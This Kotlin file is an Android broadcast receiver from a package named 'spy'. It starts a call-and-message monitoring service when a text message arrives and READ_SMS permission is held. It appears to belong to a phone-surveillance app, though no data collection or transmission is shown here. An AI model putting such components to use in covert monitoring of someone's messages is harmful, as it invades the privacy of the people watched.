package com.syncloudsoft.mobserve.spy

import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import pub.devrel.easypermissions.EasyPermissions
import timber.log.Timber

class TextMessageBroadcastReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent?) {
        Timber.v("Received broadcast %s", intent!!.action)
        if (EasyPermissions.hasPermissions(context, Manifest.permission.READ_SMS)) {
            PhoneCallOrMessageService.startSelf(context)
        }
    }
}
